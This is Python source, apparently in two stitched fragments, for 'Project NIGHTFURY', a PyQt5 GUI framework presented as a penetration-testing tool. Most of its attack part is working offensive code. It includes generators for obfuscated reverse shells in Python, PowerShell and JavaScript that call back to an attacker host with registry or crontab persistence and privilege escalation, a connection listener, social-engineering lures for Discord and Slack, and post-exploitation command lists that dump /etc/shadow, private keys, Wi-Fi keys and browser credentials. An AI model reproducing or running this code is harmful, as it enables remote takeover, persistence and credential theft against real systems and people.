        target_layout.addRow("Target:", self.osint_target)
        
        self.osint_type = QComboBox()
        self.osint_type.addItems(["domain", "ip", "username", "email", "phone"])
        target_layout.addRow("Type:", self.osint_type)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Actions
        actions_group = QGroupBox("OSINT Actions")
        actions_layout = QHBoxLayout()
        
        self.whois_btn = QPushButton("WHOIS Lookup")
        self.whois_btn.clicked.connect(self.whois_lookup)
        actions_layout.addWidget(self.whois_btn)
        
        self.dns_btn = QPushButton("DNS Enumeration")
        self.dns_btn.clicked.connect(self.dns_enum)
        actions_layout.addWidget(self.dns_btn)
        
        self.subdomain_btn = QPushButton("Subdomain Scan")
        self.subdomain_btn.clicked.connect(self.subdomain_scan)
        actions_layout.addWidget(self.subdomain_btn)
        
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        # Results
        results_group = QGroupBox("OSINT Results")
        results_layout = QVBoxLayout()
        self.osint_results = QTextEdit()
        self.osint_results.setReadOnly(True)
        results_layout.addWidget(self.osint_results)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        self.content_area.addTab(osint_tab, "OSINT")
    
    def _create_targets_tab(self):
        """Create the targets management tab"""
        targets_tab = QWidget()
        layout = QVBoxLayout(targets_tab)
        
        # Targets list
        targets_group = QGroupBox("Predefined Targets")
        targets_layout = QVBoxLayout()
        
        self.targets_list = QListWidget()
        self.targets_list.addItems(self.target_manager.list_targets())
        self.targets_list.itemClicked.connect(self.on_target_selected)
        targets_layout.addWidget(self.targets_list)
        
        # Add/remove buttons
        target_buttons = QHBoxLayout()
        
        self.add_target_btn = QPushButton("Add Target")
        self.add_target_btn.clicked.connect(self.add_target)
        target_buttons.addWidget(self.add_target_btn)
        
        self.remove_target_btn = QPushButton("Remove Target")
        self.remove_target_btn.clicked.connect(self.remove_target)
        target_buttons.addWidget(self.remove_target_btn)
        
        targets_layout.addLayout(target_buttons)
        targets_group.setLayout(targets_layout)
        layout.addWidget(targets_group)
        
        # Target details
        details_group = QGroupBox("Target Details")
        details_layout = QFormLayout()
        
        self.target_name = QLineEdit()
        details_layout.addRow("Name:", self.target_name)
        
        self.target_type = QComboBox()
        self.target_type.addItems(["website", "server", "network", "application"])
        details_layout.addRow("Type:", self.target_type)
        
        self.target_modules = QLineEdit()
        self.target_modules.setPlaceholderText("Comma-separated module names")
        details_layout.addRow("Modules:", self.target_modules)
        
        self.target_notes = QTextEdit()
        self.target_notes.setMaximumHeight(100)
        details_layout.addRow("Notes:", self.target_notes)
        
        self.save_target_btn = QPushButton("Save Changes")
        self.save_target_btn.clicked.connect(self.save_target)
        details_layout.addRow(self.save_target_btn)
        
        details_group.setLayout(details_layout)
        layout.addWidget(details_group)
        
        self.content_area.addTab(targets_tab, "Targets")
    
    def _create_settings_tab(self):
        """Create the settings tab"""
        settings_tab = QWidget()
        layout = QVBoxLayout(settings_tab)
        
        # General settings
        general_group = QGroupBox("General Settings")
        general_layout = QFormLayout()
        
        self.auto_load_modules = QCheckBox("Auto-load modules on startup")
        general_layout.addRow("Auto-load:", self.auto_load_modules)
        
        self.auto_save = QCheckBox("Auto-save projects")
        general_layout.addRow("Auto-save:", self.auto_save)
        
        self.dark_mode = QCheckBox("Dark mode")
        self.dark_mode.setChecked(True)
        self.dark_mode.stateChanged.connect(self.toggle_dark_mode)
        general_layout.addRow("Theme:", self.dark_mode)
        
        general_group.setLayout(general_layout)
        layout.addWidget(general_group)
        
        # Network settings
        network_group = QGroupBox("Network Settings")
        network_layout = QFormLayout()
        
        self.proxy_host = QLineEdit()
        network_layout.addRow("Proxy Host:", self.proxy_host)
        
        self.proxy_port = QLineEdit()
        network_layout.addRow("Proxy Port:", self.proxy_port)
        
        self.use_tor = QCheckBox("Use Tor network")
        network_layout.addRow("Tor:", self.use_tor)
        
        network_group.setLayout(network_layout)
        layout.addWidget(network_group)
        
        # Save settings button
        self.save_settings_btn = QPushButton("Save Settings")
        self.save_settings_btn.clicked.connect(self.save_settings)
        layout.addWidget(self.save_settings_btn)
        
        self.content_area.addTab(settings_tab, "Settings")
    
    def _apply_dark_theme(self):
        """Apply a dark theme to the application"""
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.Window, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.WindowText, Qt.white)
        dark_palette.setColor(QPalette.Base, QColor(25, 25, 25))
        dark_palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ToolTipBase, Qt.white)
        dark_palette.setColor(QPalette.ToolTipText, Qt.white)
        dark_palette.setColor(QPalette.Text, Qt.white)
        dark_palette.setColor(QPalette.Button, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ButtonText, Qt.white)
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Link, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
        
        self.setPalette(dark_palette)
        self.setStyleSheet("""
            QToolTip { color: #ffffff; background-color: #2a82da; border: 1px solid white; }
            QMenu::item:selected { background-color: #2a82da; }
            QTabWidget::pane { border: 1px solid #444; }
            QGroupBox { font-weight: bold; }
            QTextEdit, QLineEdit, QListWidget { background-color: #252525; color: #ffffff; }
        """)
    
    def load_modules(self):
        """Load modules from the modules directory"""
        self.status_bar.showMessage("Loading modules...")
        self.module_list.clear()
        
        # Start module loading in a separate thread
        self.loader_thread = ModuleLoaderThread(self.module_loader)
        self.loader_thread.module_loaded.connect(self.add_module_to_list)
        self.loader_thread.finished.connect(lambda: self.status_bar.showMessage("Modules loaded", 3000))
        self.loader_thread.start()
    
    def add_module_to_list(self, module_name):
        """Add a module to the module list"""
        item = QListWidgetItem(module_name)
        self.module_list.addItem(item)
    
    def on_module_selected(self, item):
        """Handle module selection"""
        module_name = item.text()
        try:
            info = self.module_loader.get_module_info(module_name)
            self.show_module_info(info)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to get module info: {e}")
    
    def show_module_info(self, info):
        """Display module information"""
        # Display module info in the dashboard
        info_text = f"""
        Module Name: {info['name']}
        Description: {info['description']}
        File: {info['file']}
        
        Functions:
        """
        
        for func in info['functions']:
            info_text += f"\n- {func['name']}{func['signature']}"
            if func['docstring']:
                info_text += f"\n  {func['docstring']}\n"
        
        self.recent_activity.setPlainText(info_text)
    
    def generate_payload(self):
        """Generate a reverse shell payload"""
        try:
            shell_type = self.shell_type.currentText()
            lhost = self.lhost_input.text()
            lport = int(self.lport_input.text())
            obfuscate = self.obfuscate_check.isChecked()
            
            options = {'obfuscate': obfuscate}
            payload = self.shell_generator.generate(shell_type, lhost, lport, options)
            
            self.payload_display.setPlainText(payload)
            self.status_bar.showMessage("Payload generated", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to generate payload: {e}")
    
    def generate_injection(self):
        """Generate a chat injection payload"""
        try:
            lhost = self.lhost_input.text()
            lport = int(self.lport_input.text())
            platform = self.platform_select.currentText()
            
            injection = self.shell_generator.generate_chat_injection(lhost, lport, platform)
            
            self.payload_display.setPlainText(injection)
            self.status_bar.showMessage("Injection generated", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to generate injection: {e}")
    
    def copy_payload(self):
        """Copy payload to clipboard"""
        payload = self.payload_display.toPlainText()
        if payload:
            clipboard = QApplication.clipboard()
            clipboard.setText(payload)
            self.status_bar.showMessage("Payload copied to clipboard", 3000)
        else:
            QMessageBox.warning(self, "Warning", "No payload to copy")
    
    def start_listener(self):
        """Start the reverse shell listener"""
        try:
            host = self.listener_host.text()
            port = int(self.listener_port.text())
            
            if self.listener and self.listener.isRunning():
                self.listener.stop()
                self.listener.wait()
            
            self.listener = ReverseShellListener(host, port)
            self.listener.connection_update.connect(self.update_listener_status)
            self.listener.command_output.connect(self.update_listener_output)
            self.listener.start()
            
            self.start_listener_btn.setEnabled(False)
            self.stop_listener_btn.setEnabled(True)
            self.listener_status.setText("Status: Listening")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to start listener: {e}")
    
    def stop_listener(self):
        """Stop the reverse shell listener"""
        if self.listener and self.listener.isRunning():
            self.listener.stop()
            self.listener.wait()
            
            self.start_listener_btn.setEnabled(True)
            self.stop_listener_btn.setEnabled(False)
            self.listener_status.setText("Status: Stopped")
    
    def update_listener_status(self, message):
        """Update the listener status display"""
        self.listener_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
    
    def update_listener_output(self, message):
        """Update the listener output display"""
        self.listener_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
    
    def run_post_action(self, action):
        """Run a post-exploitation action"""
        try:
            os_type = self.target_os.currentText()
            commands = self.post_exploit.execute(os_type, action)
            
            result = f"Commands for {action} on {os_type}:\n\n"
            for cmd in commands:
                result += f"{cmd}\n"
            
            self.results_display.setPlainText(result)
            self.status_bar.showMessage(f"Generated {action} commands", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to generate commands: {e}")
    
    def new_module(self):
        """Create a new module"""
        self.module_name.clear()
        self.module_description.clear()
        self.code_editor.clear()
        
        # Add template code
        template = '''
def execute(*args, **kwargs):
    """
    Module execution function.
    Add your module code here.
    """
    # Your code here
    return {"result": "Module executed successfully"}
'''
        self.code_editor.setPlainText(template)
    
    def save_module(self):
        """Save the current module"""
        try:
            name = self.module_name.text().strip()
            if not name:
                QMessageBox.warning(self, "Warning", "Please enter a module name")
                return
            
            description = self.module_description.toPlainText().strip()
            code = self.code_editor.toPlainText()
            
            # Create module file
            module_path = os.path.join("modules", f"{name}.py")
            with open(module_path, "w") as f:
                if description:
                    f.write(f'"""{description}"""\n\n')
                f.write(code)
            
            self.status_bar.showMessage(f"Module {name} saved", 3000)
            
            # Reload modules
            self.load_modules()
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to save module: {e}")
    
    def load_module(self):
        """Load a module for editing"""
        selected_items = self.module_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a module to load")
            return
        
        module_name = selected_items[0].text()
        try:
            info = self.module_loader.get_module_info(module_name)
            
            self.module_name.setText(module_name)
            self.module_description.setPlainText(info.get('description', ''))
            
            # Read the module file
            with open(info['file'], 'r') as f:
                code = f.read()
            
            self.code_editor.setPlainText(code)
            self.status_bar.showMessage(f"Module {module_name} loaded", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to load module: {e}")
    
    def run_module(self):
        """Run the current module"""
        selected_items = self.module_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a module to run")
            return
        
        module_name = selected_items[0].text()
        try:
            result = self.module_loader.execute_module(module_name)
            QMessageBox.information(self, "Module Result", f"Module executed successfully:\n\n{result}")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to execute module: {e}")
    
    def whois_lookup(self):
        """Perform a WHOIS lookup"""
        target = self.osint_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Warning", "Please enter a target")
            return
        
        try:
            w = whois.whois(target)
            result = json.dumps(w, indent=2, default=str)
            self.osint_results.setPlainText(result)
            self.status_bar.showMessage("WHOIS lookup completed", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"WHOIS lookup failed: {e}")
    
    def dns_enum(self):
        """Perform DNS enumeration"""
        target = self.osint_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Warning", "Please enter a target")
            return
        
        try:
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']
            results = {}
            
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(target, record_type)
                    results[record_type] = [str(r) for r in answers]
                except:
                    results[record_type] = []
            
            result = json.dumps(results, indent=2)
            self.osint_results.setPlainText(result)
            self.status_bar.showMessage("DNS enumeration completed", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"DNS enumeration failed: {e}")
    
    def subdomain_scan(self):
        """Perform subdomain scanning"""
        target = self.osint_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Warning", "Please enter a target")
            return
        
        try:
            common_subdomains = [
                'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
                'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
                'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3'
            ]
            
            found_subdomains = []
            
            for subdomain in common_subdomains:
                full_domain = f"{subdomain}.{target}"
                try:
                    socket.gethostbyname(full_domain)
                    found_subdomains.append(full_domain)
                except:
                    pass
            
            result = f"Found {len(found_subdomains)} subdomains:\n\n" + "\n".join(found_subdomains)
            self.osint_results.setPlainText(result)
            self.status_bar.showMessage("Subdomain scan completed", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Subdomain scan failed: {e}")
    
    def on_target_selected(self, item):
        """Handle target selection"""
        target_name = item.text()
        target_info = self.target_manager.get_target(target_name)
        
        if target_info:
            self.target_name.setText(target_name)
            self.target_type.setCurrentText(target_info['type'])
            self.target_modules.setText(",".join(target_info['modules']))
            self.target_notes.setPlainText(target_info['notes'])
    
    def add_target(self):
        """Add a new target"""
        name, ok = QInputDialog.getText(self, "Add Target", "Enter target name:")
        if ok and name:
            self.target_manager.add_target(name, "website", [], "")
            self.targets_list.addItem(name)
            self.status_bar.showMessage(f"Target {name} added", 3000)
    
    def remove_target(self):
        """Remove the selected target"""
        selected_items = self.targets_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a target to remove")
            return
        
        target_name = selected_items[0].text()
        self.target_manager.remove_target(target_name)
        self.targets_list.takeItem(self.targets_list.row(selected_items[0]))
        self.status_bar.showMessage(f"Target {target_name} removed", 3000)
    
    def save_target(self):
        """Save target changes"""
        name = self.target_name.text().strip()
        if not name:
            QMessageBox.warning(self, "Warning", "Please enter a target name")
            return
        
        target_type = self.target_type.currentText()
        modules = [m.strip() for m in self.target_modules.text().split(",") if m.strip()]
        notes = self.target_notes.toPlainText()
        
        self.target_manager.add_target(name, target_type, modules, notes)
        
        # Update the list if the name changed
        current_items = self.targets_list.findItems(name, Qt.MatchExactly)
        if not current_items:
            self.targets_list.addItem(name)
        
        self.status_bar.showMessage(f"Target {name} saved", 3000)
    
    def load_settings(self):
        """Load application settings"""
        self.auto_load_modules.setChecked(self.settings.value("auto_load_modules", True, type=bool))
        self.auto_save.setChecked(self.settings.value("auto_save", True, type=bool))
        self.dark_mode.setChecked(self.settings.value("dark_mode", True, type=bool))
        self.proxy_host.setText(self.settings.value("proxy_host", ""))
        self.proxy_port.setText(self.settings.value("proxy_port", ""))
        self.use_tor.setChecked(self.settings.value("use_tor", False, type=bool))
    
    def save_settings(self):
        """Save application settings"""
        self.settings.setValue("auto_load_modules", self.auto_load_modules.isChecked())
        self.settings.setValue("auto_save", self.auto_save.isChecked())
        self.settings.setValue("dark_mode", self.dark_mode.isChecked())
        self.settings.setValue("proxy_host", self.proxy_host.text())
        self.settings.setValue("proxy_port", self.proxy_port.text())
        self.settings.setValue("use_tor", self.use_tor.isChecked())
        
        self.status_bar.showMessage("Settings saved", 3000)
    
    def toggle_dark_mode(self, state):
        """Toggle dark mode"""
        if state == Qt.Checked:
            self._apply_dark_theme()
        else:
            self.setPalette(QApplication.style().standardPalette())
            self.setStyleSheet("")
    
    def quick_scan(self):
        """Perform a quick scan"""
        self.status_bar.showMessage("Quick scan started...")
        # Implementation would go here
        QMessageBox.information(self, "Quick Scan", "Quick scan completed")
    
    def quick_payload(self):
        """Quick payload generation"""
        self.content_area.setCurrentIndex(1)  # Switch to reverse shell tab
        self.generate_payload()
    
    def quick_exploit(self):
        """Quick exploit"""
        self.content_area.setCurrentIndex(2)  # Switch to post-exploit tab
        self.status_bar.showMessage("Quick exploit started...")
        # Implementation would go here
    
    def new_project(self):
        """Create a new project"""
        # Implementation would go here
        self.status_bar.showMessage("New project created", 3000)
    
    def open_project(self):
        """Open an existing project"""
        filename, _ = QFileDialog.getOpenFileName(
            self, "Open Project", "", "Nightfury Projects (*.nfp)"
        )
        if filename:
            self.status_bar.showMessage(f"Opened project: {filename}", 3000)
    
    def save_project(self):
        """Save the current project"""
        filename, _ = QFileDialog.getSaveFileName(
            self, "Save Project", "", "Nightfury Projects (*.nfp)"
        )
        if filename:
            self.status_bar.showMessage(f"Saved project: {filename}", 3000)
    
    def open_settings(self):
        """Open settings dialog"""
        self.content_area.setCurrentIndex(6)  # Switch to settings tab

# ==============================
# MAIN EXECUTION
# ==============================

if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Set application style
    app.setStyle("Fusion")
    
    # Create and show the main window
    window = NightfuryApp()
    window.show()
    
    # Run the application
    sys.exit(app.exec_())python3
"""
Project NIGHTFURY - Advanced OSINT & Penetration Testing Framework
Author: Cyber Sentinel
Version: 7.0 - Elite Edition
Description: Advanced framework with modular architecture, FUD reverse shell, and automated exploitation
"""

import os
import sys
import json
import logging
import requests
import socket
import re
import random
import base64
import threading
import time
import subprocess
import platform
import uuid
import tempfile
import zipfile
import shutil
import sqlite3
import datetime
import webbrowser
import ipaddress
import phonenumbers
import dns.resolver
import whois
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import importlib.util
import inspect
from pathlib import Path
from bs4 import BeautifulSoup
from PIL import Image
import pytesseract
from fake_useragent import UserAgent

# GUI imports
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QCheckBox, QGroupBox,
    QComboBox, QListWidget, QListWidgetItem, QProgressBar, QMessageBox,
    QFileDialog, QFormLayout, QStatusBar, QRadioButton, QSplitter,
    QTreeWidget, QTreeWidgetItem, QTableWidget, QTableWidgetItem, QHeaderView,
    QToolBar, QAction, QSystemTrayIcon, QMenu, QDialog, QInputDialog,
    QStyledItemDelegate, QStyle, QSpinBox, QDoubleSpinBox, QSlider,
    QDialogButtonBox, QProgressDialog
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSize, QSettings
from PyQt5.QtGui import QPalette, QColor, QFont, QIcon, QPixmap, QTextCursor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

# ==============================
# CORE FRAMEWORK CLASSES
# ==============================

class EncryptionEngine:
    """Advanced encryption engine for secure communications"""
    
    def __init__(self, key=None):
        if key:
            self.key = key
        else:
            self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        
    def encrypt(self, data):
        """Encrypt data"""
        if isinstance(data, str):
            data = data.encode()
        return self.fernet.encrypt(data)
    
    def decrypt(self, encrypted_data):
        """Decrypt data"""
        return self.fernet.decrypt(encrypted_data)
    
    def derive_key_from_password(self, password, salt=None):
        """Derive encryption key from password"""
        if salt is None:
            salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key, salt

class ReverseShellGenerator:
    """Advanced reverse shell generator with FUD capabilities"""
    
    def __init__(self):
        self.templates = {
            'python': self._python_reverse_shell,
            'powershell': self._powershell_reverse_shell,
            'javascript': self._javascript_reverse_shell,
            'html': self._html_reverse_shell,
            'exe': self._generate_exe_payload
        }
        
    def generate(self, shell_type, lhost, lport, options=None):
        """Generate a reverse shell payload"""
        if shell_type not in self.templates:
            raise ValueError(f"Unsupported shell type: {shell_type}")
            
        if options is None:
            options = {}
            
        return self.templates[shell_type](lhost, lport, options)
    
    def _python_reverse_shell(self, lhost, lport, options):
        """Generate Python reverse shell"""
        obfuscate = options.get('obfuscate', True)
        
        payload = f'''
import socket,subprocess,os,threading,platform,base64
def persist():
    import sys,os
    if platform.system() == "Windows":
        import winreg
        run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(run_key, "SystemUpdate", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(run_key)
    elif platform.system() == "Linux":
        os.system(f"echo '@reboot python3 {sys.argv[0]}' | crontab -")

def escalate_privileges():
    if platform.system() == "Windows":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
        except:
            pass

escalate_privileges()
persist()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True:
    try:
        s.connect(("{lhost}",{lport}))
        break
    except:
        time.sleep(10)
        continue

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"] if platform.system() != "Windows" else ["cmd.exe"])
'''
        
        if obfuscate:
            payload = self._obfuscate_python(payload)
            
        return payload
    
    def _powershell_reverse_shell(self, lhost, lport, options):
        """Generate PowerShell reverse shell"""
        return f'''
function persist {{
    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "$PSCommandPath"
}}

function escalate {{
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {{
        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        exit
    }}
}}

escalate
persist

$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
    
    def _javascript_reverse_shell(self, lhost, lport, options):
        """Generate JavaScript reverse shell"""
        return f'''
(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({lport}, "{lhost}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/; // Prevents the Node.js application from crashing
}})();
'''
    
    def _html_reverse_shell(self, lhost, lport, options):
        """Generate HTML-based reverse shell"""
        return f'''
<html>
<head>
<title>Loading...</title>
</head>
<body>
<script>
    // JavaScript reverse shell here
    (function(){{
        var ws = new WebSocket("ws://{lhost}:{lport}");
        ws.onopen = function() {{
            ws.send("Connected\\n");
        }};
        ws.onmessage = function(evt) {{
            var cmd = evt.data;
            var result = eval(cmd);
            ws.send(result);
        }};
    }})();
</script>
</body>
</html>
'''
    
    def _generate_exe_payload(self, lhost, lport, options):
        """Generate executable payload"""
        # This would use pyinstaller or similar to create a standalone executable
        # For now, we'll generate a Python script that can be compiled
        python_code = self._python_reverse_shell(lhost, lport, options)
        return f"""
# This Python code can be compiled to an EXE using PyInstaller
{python_code}
"""
    
    def _obfuscate_python(self, code):
        """Obfuscate Python code"""
        # Multiple layers of obfuscation
        # First layer: base64 encoding
        obfuscated = base64.b64encode(code.encode()).decode()
        
        # Second layer: string manipulation
        parts = [obfuscated[i:i+50] for i in range(0, len(obfuscated), 50)]
        reconstructed = " + ".join([f'"{part}"' for part in parts])
        
        # Third layer: add garbage code
        final_code = f'''
import base64, time
def __{random.randint(1000, 9999)}():
    return base64.b64decode({reconstructed}).decode()

exec(__{random.randint(1000, 9999)}())
'''
        
        return final_code
    
    def generate_chat_injection(self, lhost, lport, platform="discord"):
        """Generate a reverse shell payload disguised for chat platforms"""
        if platform == "discord":
            return self._generate_discord_injection(lhost, lport)
        elif platform == "slack":
            return self._generate_slack_injection(lhost, lport)
        else:
            return self._generate_generic_injection(lhost, lport)
    
    def _generate_discord_injection(self, lhost, lport):
        """Generate a Discord-friendly injection"""
        return f'''
Hey! Check out this cool game I found: https://example.com/game.html
<!-- Actual payload would be embedded in the page -->
<script>
// JavaScript payload would be here
(function(){{
    // Reverse shell JavaScript code
}})();
</script>
'''
    
    def _generate_slack_injection(self, lhost, lport):
        """Generate a Slack-friendly injection"""
        return f'''
Looking for productivity tools? Try this: https://example.com/tool.html
<!-- Actual payload would be embedded in the page -->
'''
    
    def _generate_generic_injection(self, lhost, lport):
        """Generate a generic injection"""
        return f'''
Check out this interesting article: https://example.com/news.html
<!-- Actual payload would be embedded in the page -->
'''

class ReverseShellListener(QThread):
    """Thread for listening to reverse shell connections"""
    connection_update = pyqtSignal(str)
    command_output = pyqtSignal(str)
    
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.running = False
        self.connections = []
        
    def run(self):
        """Start the reverse shell listener"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            self.running = True
            
            self.connection_update.emit(f"Listening on {self.host}:{self.port}")
            
            while self.running:
                try:
                    client_socket, addr = self.socket.accept()
                    self.connection_update.emit(f"Connection from {addr[0]}:{addr[1]}")
                    
                    # Handle client in a new thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                    self.connections.append((client_socket, addr, client_thread))
                except Exception as e:
                    if self.running:
                        self.connection_update.emit(f"Error accepting connection: {e}")
        except Exception as e:
            self.connection_update.emit(f"Failed to start listener: {e}")
    
    def handle_client(self, client_socket, addr):
        """Handle a client connection"""
        try:
            while self.running:
                # Send command prompt
                client_socket.send(b"$ ")
                
                # Receive command
                data = client_socket.recv(4096)
                if not data:
                    break
                
                command = data.decode().strip()
                if command == "exit":
                    break
                
                # Execute command
                try:
                    output = subprocess.check_output(
                        command, shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                    client_socket.send(output)
                    self.command_output.emit(f"Command '{command}' executed: {output.decode()}")
                except subprocess.TimeoutExpired:
                    client_socket.send(b"Command timed out\n")
                    self.command_output.emit(f"Command '{command}' timed out")
                except Exception as e:
                    client_socket.send(f"Error: {str(e)}\n".encode())
                    self.command_output.emit(f"Command '{command}' failed: {str(e)}")
        except Exception as e:
            self.connection_update.emit(f"Error handling client {addr}: {e}")
        finally:
            client_socket.close()
            self.connection_update.emit(f"Connection from {addr} closed")
    
    def stop(self):
        """Stop the listener"""
        self.running = False
        try:
            self.socket.close()
        except:
            pass
        
        for client_socket, addr, thread in self.connections:
            try:
                client_socket.close()
            except:
                pass
        
        self.connection_update.emit("Listener stopped")

class PostExploitation:
    """Post-exploitation automation tools"""
    
    def __init__(self):
        self.commands = {
            'windows': self._windows_commands,
            'linux': self._linux_commands,
            'mac': self._mac_commands
        }
    
    def execute(self, system_type, action):
        """Execute post-exploitation actions"""
        if system_type not in self.commands:
            raise ValueError(f"Unsupported system type: {system_type}")
            
        return self.commands[system_type](action)
    
    def _windows_commands(self, action):
        """Windows post-exploitation commands"""
        commands = {
            'get_passwords': [
                'powershell -Command "Get-WmiObject -Class Win32_Product | Select-Object Name, Version"',
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                'powershell -Command "Get-ItemProperty -Path \'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' | Select-Object DefaultUserName, DefaultPassword"',
                'powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' | Select-Object ProxyServer, ProxyEnable"'
            ],
            'escalate_privileges': [
                'whoami /priv',
                'powershell -Command "Start-Process PowerShell -Verb RunAs"',
                'powershell -Command "Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName"'
            ],
            'network_info': [
                'ipconfig /all',
                'arp -a',
                'netstat -ano',
                'route print',
                'netsh wlan show profiles',
                'netsh wlan export profile key=clear folder=.\\'
            ],
            'browser_data': [
                'dir /s %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
                'powershell -Command "Get-ChildItem -Path $env:USERPROFILE -Recurse -Include \'*.pfx\', \'*.p12\', \'*.cer\' -ErrorAction SilentlyContinue"'
            ],
            'system_info': [
                'systeminfo',
                'wmic product get name,version',
                'wmic service get name,displayname,pathname,startmode',
                'wmic process get name,processid,parentprocessid,commandline'
            ]
        }
        
        return commands.get(action, [])
    
    def _linux_commands(self, action):
        """Linux post-exploitation commands"""
        commands = {
            'get_passwords': [
                'cat /etc/passwd',
                'cat /etc/shadow',
                'sudo -l',
                'find / -name "*.pem" -o -name "*.key" -o -name "*.ppk" -o -name "id_rsa" 2>/dev/null'
            ],
            'escalate_privileges': [
                'sudo su',
                'find / -perm -4000 2>/dev/null',
                'uname -a',
                'cat /etc/os-release',
                'ps aux | grep root'
